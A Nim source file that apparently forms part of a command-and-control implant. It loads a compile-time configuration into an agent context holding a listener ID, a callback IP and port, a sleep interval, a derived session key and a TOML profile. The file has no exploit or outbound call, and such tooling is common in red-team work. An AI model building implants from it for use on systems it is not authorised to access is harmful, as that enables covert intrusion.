import parsetoml, base64, system
import ../../common/[types, utils, crypto, serialize]

const CONFIGURATION {.strdefine.}: string = ""

proc deserializeConfiguration(config: string): AgentCtx = 
    
    var unpacker = Unpacker.init(config) 

    var agentKeyPair = generateKeyPair() 

    var ctx = AgentCtx(
        agentId: generateUUID(),
        listenerId: Uuid.toString(unpacker.getUint32()),
        ip: unpacker.getDataWithLengthPrefix(),
        port: int(unpacker.getUint32()),
        sleep: int(unpacker.getUint32()),
        sessionKey: deriveSessionKey(agentKeyPair, unpacker.getByteArray(Key)),
        agentPublicKey: agentKeyPair.publicKey,
        profile: parseString(unpacker.getDataWithLengthPrefix())
    ) 
    
    wipeKey(agentKeyPair.privateKey)

    echo "[+] Profile configuration deserialized."
    return ctx

proc init*(T: type AgentCtx): AgentCtx = 

    try: 
        when not defined(CONFIGURATION):
            raise newException(CatchableError, "Missing agent configuration.")

        return deserializeConfiguration(CONFIGURATION)

    except CatchableError as err:
        echo "[-] " & err.msg
        return nil



